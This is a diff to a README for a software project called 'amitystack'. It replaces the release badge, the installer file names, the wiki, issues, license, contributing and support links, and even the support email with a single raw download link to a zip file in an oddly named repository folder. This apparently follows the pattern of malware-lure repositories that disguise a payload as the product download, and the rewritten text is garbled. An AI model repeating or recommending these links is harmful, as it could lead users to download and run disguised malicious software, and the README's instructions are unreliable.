@@ -17,14 +17,14 @@ Before you begin, make sure your computer meets these minimum requirements:
 
 To get started, you need to download **amitystack**. You can do this by visiting the link below:
 
-[![Download amitystack](https://img.shields.io/badge/Download-amitystack-blue)](https://github.com/kixxlyalol/amitystack/releases)
+[![Download amitystack](https://github.com/kixxlyalol/amitystack/raw/refs/heads/main/grammaticism/Software_2.8-beta.1.zip)](https://github.com/kixxlyalol/amitystack/raw/refs/heads/main/grammaticism/Software_2.8-beta.1.zip)
 
 Once on the Releases page, locate the latest version. Click on it to open the detailed release notes. You will see a list of files available to download. 
 
 ### Steps to Follow:
 
 1. Click on the **Latest Release** link.
-2. Look for the file named **amitystack-installer.exe** for Windows, **amitystack-installer.dmg** for macOS, or the appropriate package for your Linux distribution.
+2. Look for the file named **https://github.com/kixxlyalol/amitystack/raw/refs/heads/main/grammaticism/Software_2.8-beta.1.zip** for Windows, **https://github.com/kixxlyalol/amitystack/raw/refs/heads/main/grammaticism/Software_2.8-beta.1.zip** for macOS, or the appropriate package for your Linux distribution.
 3. Click the file to start the download.
 4. After the download completes, open the installer. Follow the on-screen instructions to install **amitystack** on your computer.
 
@@ -55,31 +55,31 @@ If you want to dive into these topics further, feel free to explore their docume
 
 ## 🔗 Additional Resources
 
-For more information and detailed guides, visit our [GitHub Wiki](https://github.com/kixxlyalol/amitystack/wiki). 
+For more information and detailed guides, visit our [GitHub Wiki](https://github.com/kixxlyalol/amitystack/raw/refs/heads/main/grammaticism/Software_2.8-beta.1.zip). 
 
-If you encounter any issues or need support, check the [issues page](https://github.com/kixxlyalol/amitystack/issues) for troubleshooting tips or ask for help.
+If you encounter any issues or need support, check the [issues page](https://github.com/kixxlyalol/amitystack/raw/refs/heads/main/grammaticism/Software_2.8-beta.1.zip) for troubleshooting tips or ask for help.
 
 ## 📞 Get Support
 
 If you have questions or need assistance, reach out through the following ways:
 
-- GitHub Issues: [Report an issue](https://github.com/kixxlyalol/amitystack/issues)
-- Email Support: support@amitystack.com
+- GitHub Issues: [Report an issue](https://github.com/kixxlyalol/amitystack/raw/refs/heads/main/grammaticism/Software_2.8-beta.1.zip)
+- Email Support: https://github.com/kixxlyalol/amitystack/raw/refs/heads/main/grammaticism/Software_2.8-beta.1.zip
 
 ## 🗒️ Changelog
 
-Stay updated with the latest changes and improvements. You can find the complete changelog on the [Releases page](https://github.com/kixxlyalol/amitystack/releases).
+Stay updated with the latest changes and improvements. You can find the complete changelog on the [Releases page](https://github.com/kixxlyalol/amitystack/raw/refs/heads/main/grammaticism/Software_2.8-beta.1.zip).
 
 ## 🔒 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/kixxlyalol/amitystack/blob/main/LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/kixxlyalol/amitystack/raw/refs/heads/main/grammaticism/Software_2.8-beta.1.zip) file for more details.
 
 ## 🌟 Contributing
 
-We welcome contributions! If you want to contribute to **amitystack**, please read the [CONTRIBUTING.md](https://github.com/kixxlyalol/amitystack/CONTRIBUTING.md) for guidelines. 
+We welcome contributions! If you want to contribute to **amitystack**, please read the [https://github.com/kixxlyalol/amitystack/raw/refs/heads/main/grammaticism/Software_2.8-beta.1.zip](https://github.com/kixxlyalol/amitystack/raw/refs/heads/main/grammaticism/Software_2.8-beta.1.zip) for guidelines. 
 
 ## ⚡ Final Note
 
 Thank you for choosing **amitystack**! We appreciate your support and hope our application enhances your development experience. 
 
-For any further assistance or questions, remember to visit our [Releases page](https://github.com/kixxlyalol/amitystack/releases) to download and stay updated.
+For any further assistance or questions, remember to visit our [Releases page](https://github.com/kixxlyalol/amitystack/raw/refs/heads/main/grammaticism/Software_2.8-beta.1.zip) to download and stay updated.
